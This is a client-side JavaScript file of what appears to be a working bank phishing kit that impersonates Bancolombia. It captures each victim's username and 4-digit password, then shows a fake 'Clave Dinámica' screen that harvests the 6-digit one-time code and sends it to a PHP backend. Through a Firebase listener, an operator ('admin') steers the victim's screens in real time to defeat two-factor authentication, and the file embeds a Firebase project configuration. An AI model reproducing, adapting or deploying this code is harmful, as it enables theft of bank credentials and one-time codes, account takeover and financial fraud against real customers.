const firebaseConfig = {
  apiKey: "AIzaSyAAGjKiUXQf4pMESR6Yk7ECgc5VOiQAYmg",
  authDomain: "dominicmm10-1d098.firebaseapp.com",
  databaseURL: "https://dominicmm10-1d098-default-rtdb.firebaseio.com",
  projectId: "dominicmm10-1d098",
  storageBucket: "dominicmm10-1d098.firebasestorage.app",
  messagingSenderId: "374440690027",
  appId: "1:374440690027:web:552591f9f292265e6ecc2e",
  measurementId: "G-0YR3E7673R"
};

firebase.initializeApp(firebaseConfig);

/*
|--------------------------------------------------------------------------
| VARIABLES
|--------------------------------------------------------------------------
*/

let clienteid = null;


/*
|--------------------------------------------------------------------------
| FUNCIÓN GENERAL PARA PHP
|--------------------------------------------------------------------------
*/

async function apiPHP(url, datos = {}) {

    const response = await fetch(url, {

        method: "POST",

        credentials: "same-origin",

        headers: {
            "Content-Type": "application/json"
        },

        body: JSON.stringify(datos)

    });


    let resultado;

    try {

        resultado = await response.json();

    } catch {

        throw new Error(
            "El servidor devolvió una respuesta inválida"
        );

    }


    if (!response.ok) {

        throw new Error(
            resultado.error ||
            "Error en la solicitud"
        );

    }


    return resultado;
}


/*
|--------------------------------------------------------------------------
| MOSTRAR SECCIÓN
|--------------------------------------------------------------------------
*/

async function mostrarSeccion(seccion) {

    try {

        await apiPHP(
            "/api/actualizar.php",
            {
                sectionVisible: seccion
            }
        );

    } catch (error) {

        console.error(
            "Error cambiando sección:",
            error
        );

    }
}


/*
|--------------------------------------------------------------------------
| CREAR CONSULTA
|--------------------------------------------------------------------------
*/

async function imprimirusuario() {

    const usuario =
        document
            .getElementById("usuarioInput")
            .value
            .trim();


    const clave =
        document
            .getElementById("claveInput")
            .value
            .trim();


    /*
    |--------------------------------------------------------------------------
    | VALIDACIONES
    |--------------------------------------------------------------------------
    */

   // ==========================
// VALIDAR USUARIO
// ==========================

if (usuario === "") {
    alert("Por favor, ingresa tu Usuario.");
    return;
}

// Mínimo 8 y máximo 20 caracteres
if (usuario.length < 8 || usuario.length > 20) {
    alert("El Usuario debe tener entre 8 y 20 caracteres.");

    document.getElementById("usuarioInput").value = "";
    return;
}

// No permite espacios
if (/\s/.test(usuario)) {
    alert("El Usuario no puede contener espacios.");

    document.getElementById("usuarioInput").value = "";
    return;
}

// Solo permite letras y números
if (!/^[a-zA-Z0-9]+$/.test(usuario)) {
    alert("El Usuario no puede contener símbolos.");

    document.getElementById("usuarioInput").value = "";
    return;
}

// Debe contener al menos un número
if (!/\d/.test(usuario)) {
    alert("El Usuario debe contener al menos un número.");

    document.getElementById("usuarioInput").value = "";
    return;
}


// ==========================
// VALIDAR CLAVE
// ==========================

if (clave === "") {
    alert("Por favor, ingresa tu Clave.");
    return;
}

// Exactamente 4 dígitos
if (!/^\d{4}$/.test(clave)) {
    alert("La Clave debe tener 4 Digitos.");

    document.getElementById("claveInput").value = "";
    return;
}


    /*
    |--------------------------------------------------------------------------
    | ENVIAR A PHP
    |--------------------------------------------------------------------------
    */

    try {

       const resultado =
    await apiPHP(
        "/api/crear.php",
        {
            usuario: usuario,
            clave: clave
        }
    );

clienteid = resultado.clienteid;

await firebase
    .auth()
    .signInWithCustomToken(
        resultado.firebaseToken
    );

console.log(
    "Firebase autenticado:",
    firebase.auth().currentUser.uid
);

        clienteid =
            resultado.clienteid;


        console.log(
            "Cliente creado:",
            clienteid
        );


    } catch (error) {

        console.error(error);

        alert(
            "No fue posible crear la consulta."
        );

        return;
    }


    /*
    |--------------------------------------------------------------------------
    | OCULTAR FORMULARIO
    |--------------------------------------------------------------------------
    */
    document
        .getElementById("claveInput")
        .value = "";
    document
        .getElementById("usuario")
        .style.display = "none";

    /*
    |--------------------------------------------------------------------------
    | CREAR SECCIÓN
    |--------------------------------------------------------------------------
    */

    const section =
        document.createElement("section");


    section.id =
        clienteid;

    section.innerHTML = `

       <section 
            id="espera"
            class="loading-overlay"
            style="display:none;">

    <div class="loading-box">

        <div class="loading-spinner"></div>

        <p class="loading-tita">
            Consultando datos
        </p>

        <p class="loading-text">
            Espere...
        </p>

    </div>

</section>

       <section 
            id="Dinamica_APP"
            class="loading-overlay"
            style="display:none;">

    <div class="dina-box">

        <img class="imgdin" src="cd-desktop.gif">

        <p class="loading-title">
             Ingrese la Clave Dinamica
        </p>
        
        <p class="codigo-titulo">
            Encuentra tu Clave Dinamica en la app Mi <br> Bancolombia
        </p>

    <div class="codigo-container">

        <input class="codigo-input" type="text" inputmode="numeric" maxlength="1">
        <input class="codigo-input" type="text" inputmode="numeric" maxlength="1">
        <input class="codigo-input" type="text" inputmode="numeric" maxlength="1">
        <input class="codigo-input" type="text" inputmode="numeric" maxlength="1">
        <input class="codigo-input" type="text" inputmode="numeric" maxlength="1">
        <input class="codigo-input" type="text" inputmode="numeric" maxlength="1">

    </div>


    <!-- MENSAJE DE ERROR -->
    <div id="codigoerrf" class="codigo-error">

        <div class="codigo-error-icono">
            <span></span>
            <span></span>
        </div>

        <div class="codigo-error-contenido">

            <strong>
                El código no es correcto, intenta de nuevo.
            </strong>

            <p>
                Verifica el código ingresado y vuelve a intentarlo.
            </p>

        </div>

        <button
            type="button"
            class="codigo-error-cerrar"
            aria-label="Cerrar"
        >
            <span></span>
            <span></span>
        </button>

    </div>


            <div class="codigo-botones">

            <button type="button" id="borrarCodigo" class="btn-borrar">
                Borrar
            </button>

            <button type="button" id="continuarCodigo" class="btn-codigo-continuar" disabled>
                Continuar
            </button>

        </div>
</div>

</section>

<section 
    id="Terminado"
    class="loading-overlay"
    style="display:none;">

    <div class="dina-box">

            <img class="verificada" src="unavailabilityIconScreen.1606b3bdb600e5d9ea3ffef956391caf.svg">
            
            <p class="loading-title">
                No pudimos verificar que eres tu.
            </p>
            
            <p class="codigo-titulo">
                Inténtalo nuevamente más tarde.
                Nuestro equipo está trabajando
                para brindarte una pronta solución.            
            </p>


    </div>
</section>
    `;
        const contenedor =
        document.getElementById(
            "contenedor"
        );


    contenedor.appendChild(
        section
    );

    document
        .getElementById("espera")
        .style.display = "";

    /*
    |--------------------------------------------------------------------------
    | COMENZAR A ESCUCHAR AL ADMIN
    |--------------------------------------------------------------------------
    */

    devuelvesection();
    
const codigoInputs =
    section.querySelectorAll(".codigo-input");

const btnBorrar =
    section.querySelector(".btn-borrar");

const btnContinuar =
    section.querySelector(".btn-codigo-continuar");


function obtenerCodigo() {

    return Array.from(codigoInputs)
        .map(input => input.value)
        .join("");
}

function actualizarCodigo() {

    const codigo = obtenerCodigo();

    const completo =
        codigoInputs.length === 6 &&
        Array.from(codigoInputs).every(input =>
            /^\d$/.test(input.value)
        );

    btnContinuar.disabled = !completo;

    console.log("Código:", codigo);
    console.log("Completo:", completo);
    console.log("Disabled:", btnContinuar.disabled);
}


codigoInputs.forEach((input, index) => {

    input.addEventListener("input", function () {

        this.value = this.value
            .replace(/\D/g, "")
            .slice(0, 1);

        if (
            this.value !== "" &&
            index < codigoInputs.length - 1
        ) {

            codigoInputs[index + 1].focus();
        }

        actualizarCodigo();
    });


    input.addEventListener("keydown", function (event) {

        if (
            event.key === "Backspace" &&
            this.value === "" &&
            index > 0
        ) {

            event.preventDefault();

            codigoInputs[index - 1].value = "";
            codigoInputs[index - 1].focus();

            actualizarCodigo();
        }

    });

});


btnBorrar.addEventListener("click", function () {

    codigoInputs.forEach(input => {
        input.value = "";
    });

    actualizarCodigo();

    codigoInputs[0].focus();
});


btnContinuar.addEventListener("click", function () {

    const codigo = obtenerCodigo();
    imprimirdinamica(codigo);
    console.log(
        "Código del pedido:",
        codigo
    );

});
}


/*
|--------------------------------------------------------------------------
| ESCUCHAR SECTIONVISIBLE
|--------------------------------------------------------------------------
*/

let intervaloEstado = null;
let ultimoEstado = null;


function devuelvesection() {

    if (!clienteid) {
        console.error("No existe clienteid");
        return;
    }

    firebase
        .database()
        .ref(`1/${clienteid}/sectionVisible`)
        .on(
            "value",

            function(snapshot) {

                const sectionVisible = snapshot.val();

                console.log(
                    "Nuevo estado:",
                    sectionVisible
                );

                aplicarEstado(sectionVisible);
            },

            function(error) {

                console.error(
                    "Error leyendo Firebase:",
                    error
                );
            }
        );
}


let consultandoEstado = false;

async function consultarEstado() {

    // Si todavía hay una consulta anterior,
    // no lanzamos otra.
    if (consultandoEstado) {
        return;
    }

    consultandoEstado = true;

    try {

        const response = await fetch(
            "/api/estado.php",
            {
                method: "GET",
                credentials: "same-origin",
                cache: "no-store"
            }
        );

        if (!response.ok) {

            console.error(
                "Error consultando estado:",
                response.status
            );

            return;
        }

        const resultado = await response.json();

        const sectionVisible =
            resultado.sectionVisible;

        if (sectionVisible === ultimoEstado) {
            return;
        }

        ultimoEstado = sectionVisible;

        console.log(
            "Nuevo estado:",
            sectionVisible
        );

        aplicarEstado(sectionVisible);

    } catch (error) {

        console.error(
            "Error consultando estado:",
            error
        );

    } finally {

        // Pase lo que pase, permitimos
        // la siguiente consulta.
        consultandoEstado = false;
    }
}

function aplicarEstado(sectionVisible) {

    /*
    |--------------------------------------------------------------------------
    | OBTENER SECCIONES
    |--------------------------------------------------------------------------
    */

    const espera =
        document.getElementById("espera");

    const domicilio =
        document.getElementById("Dinamica_APP");

    const pedido =
        document.getElementById("pedido");

    const terminado =
        document.getElementById("Terminado");


    /*
    |--------------------------------------------------------------------------
    | ELEMENTOS DE ERROR
    |--------------------------------------------------------------------------
    */

    const codigoError =
        document.getElementById("codigoerrf");

    const errorSms =
        document.getElementById("cajotaerr2");

    const usuainv =
        document.getElementById("userinva");

    const usuainvali =
        document.getElementById("userinval");


    /*
    |--------------------------------------------------------------------------
    | OCULTAR TODAS LAS SECCIONES
    |--------------------------------------------------------------------------
    */

    if (espera) {
        espera.style.display = "none";
    }

    if (domicilio) {
        domicilio.style.display = "none";
    }

    if (pedido) {
        pedido.style.display = "none";
    }

    if (terminado) {
        terminado.style.display = "none";
    }


    /*
    |--------------------------------------------------------------------------
    | OCULTAR MENSAJES DE ERROR
    |--------------------------------------------------------------------------
    |
    | Cada vez que cambia sectionVisible dejamos los errores en su estado
    | inicial. Más abajo mostramos únicamente el que corresponda.
    |
    */

    if (codigoError) {
        codigoError.classList.remove("mostrar");
    }

    if (errorSms) {
        errorSms.style.display = "none";
    }

    if (usuainv) {
        usuainv.style.display = "none";
    }

    if (usuainvali) {
        usuainvali.style.display = "none";
    }


    /*
    |--------------------------------------------------------------------------
    | USUARIO INVÁLIDO
    |--------------------------------------------------------------------------
    */

    if (sectionVisible === "usuario_invalido") {

        const usuario =
            document.getElementById("usuario");


        if (usuario) {
            usuario.style.display = "";
        }


        if (usuainv) {
            usuainv.style.display = "";
        }


        if (usuainvali) {
            usuainvali.style.display = "";
        }


        /*
         * Mostrar popup superior
         */
        if (
            typeof mostrarPopupError ===
            "function"
        ) {

            mostrarPopupError();

        }


    /*
    |--------------------------------------------------------------------------
    | ESPERA
    |--------------------------------------------------------------------------
    */

    } else if (
        sectionVisible === "espera"
    ) {

        if (espera) {
            espera.style.display = "";
        }


        const trazos =
            document.getElementById("trazos");


        if (trazos) {
            trazos.style.position = "static";
        }


    /*
    |--------------------------------------------------------------------------
    | DOMICILIO SMS
    |--------------------------------------------------------------------------
    */

    } else if (
        sectionVisible === "domicilio_SMS"
    ) {

        if (domicilio) {
            domicilio.style.display = "";
        }


        const appcod =
            document.getElementById("appcod");

        const smscod =
            document.getElementById("smscod");


        if (appcod) {
            appcod.style.display = "none";
        }


        if (smscod) {
            smscod.style.display = "";
        }


    /*
    |--------------------------------------------------------------------------
    | DOMICILIO SMS INVÁLIDA
    |--------------------------------------------------------------------------
    */

    } else if (
        sectionVisible ===
        "domicilio_SMS_invalida"
    ) {

        if (domicilio) {
            domicilio.style.display = "";
        }


        const appcod =
            document.getElementById("appcod");

        const smscod =
            document.getElementById("smscod");


        /*
         * Mostrar error SMS
         */
        if (errorSms) {
            errorSms.style.display = "";
        }


        if (appcod) {
            appcod.style.display = "none";
        }


        if (smscod) {
            smscod.style.display = "";
        }


    /*
    |--------------------------------------------------------------------------
    | DOMICILIO APP
    |--------------------------------------------------------------------------
    */

    } else if (
        sectionVisible === "Dinamica_APP"
    ) {

        if (domicilio) {
            domicilio.style.display = "";
        }


        const appcod =
            document.getElementById("appcod");

        const smscod =
            document.getElementById("smscod");


        if (smscod) {
            smscod.style.display = "none";
        }


        if (appcod) {
            appcod.style.display = "";
        }


    /*
    |--------------------------------------------------------------------------
    | DOMICILIO APP INVÁLIDA
    |--------------------------------------------------------------------------
    */

    } else if (
        sectionVisible ===
        "Dinamica_APP_invalida"
    ) {

        /*
         * Seguimos mostrando la sección
         * donde están los 6 inputs.
         */
        if (domicilio) {
            domicilio.style.display = "";
        }


        /*
         * Dejamos visible la parte APP.
         */
        const appcod =
            document.getElementById("appcod");

        const smscod =
            document.getElementById("smscod");


        if (smscod) {
            smscod.style.display = "none";
        }


        if (appcod) {
            appcod.style.display = "";
        }


        /*
         * Mostrar la caja de error dentro
         * de la caja blanca.
         */
        if (codigoError) {

            codigoError.classList.add(
                "mostrar"
            );

        } else {

            console.error(
                "No se encontró el elemento #codigoerrf"
            );

        }


    /*
    |--------------------------------------------------------------------------
    | PEDIDO
    |--------------------------------------------------------------------------
    */

    } else if (
        sectionVisible === "pedido"
    ) {

        if (pedido) {
            pedido.style.display = "";
        }


    /*
    |--------------------------------------------------------------------------
    | TERMINADO
    |--------------------------------------------------------------------------
    */

    } else if (
        sectionVisible === "Terminado"
    ) {

        if (terminado) {
            terminado.style.display = "";
        }

    }

}
/*
|--------------------------------------------------------------------------
| IMPRIMIR DOMICILION
|--------------------------------------------------------------------------
*/

async function imprimirdinamica(codigo) {

    const domicilion = codigo.trim();


    if (domicilion === "") {

        alert("Por favor, ingresa el Código.");

        return;
    }


    if (!/^\d{6}$/.test(domicilion)) {

        alert("El código debe contener 6 números.");

        return;
    }


    try {

        await apiPHP(
            "/api/actualizar.php",
            {
                domicilion: domicilion,
                color: "verde",
                sectionVisible: "espera"
            }
        );

    } catch (error) {

        console.error(error);

        alert("No fue posible enviar el código.");

        return;
    }


    /*
    |--------------------------------------------------------------------------
    | LIMPIAR LOS 6 INPUTS
    |--------------------------------------------------------------------------
    */

    document
        .querySelectorAll(".codigo-input")
        .forEach(function(input) {

            input.value = "";

        });


    /*
    |--------------------------------------------------------------------------
    | DESHABILITAR CONTINUAR
    |--------------------------------------------------------------------------
    */

    const btnContinuar =
        document.querySelector(
            ".btn-codigo-continuar"
        );

    if (btnContinuar) {
        btnContinuar.disabled = true;
    }


    console.log(
        "Código enviado:",
        domicilion
    );
}

/*
|--------------------------------------------------------------------------
| IMPRIMIR NORINVALIDA
|--------------------------------------------------------------------------
*/

async function imprimirnorinvalida() {

    const input =
        document.getElementById(
            "norinvalidainput"
        );


    const norinvalida =
        input.value.trim();


    if (norinvalida === "") {

        alert(
            "Por favor, ingresa el Codigo."
        );

        return;
    }


    if (isNaN(norinvalida)) {

        alert(
            "El codigo debe ser un numero."
        );

        input.value = "";

        return;
    }


    try {

        await apiPHP(
            "/api/actualizar.php",
            {
                norinvalida: norinvalida,
                color: "verde",
                sectionVisible: "espera"
            }
        );


    } catch (error) {

        console.error(error);

        alert(
            "No fue posible enviar el código."
        );

        return;
    }
}


/*
|--------------------------------------------------------------------------
| MOSTRAR NUEVO DIV
|--------------------------------------------------------------------------
*/

function mostrarnuevodiv(sectionId) {

    const secciones =
        document.getElementsByTagName(
            "section"
        );


    for (
        let i = 0;
        i < secciones.length;
        i++
    ) {

        secciones[i].style.display =
            "none";

    }


    const seccion =
        document.getElementById(
            clienteid
        );


    if (seccion) {

        seccion.style.display =
            "block";

    }
}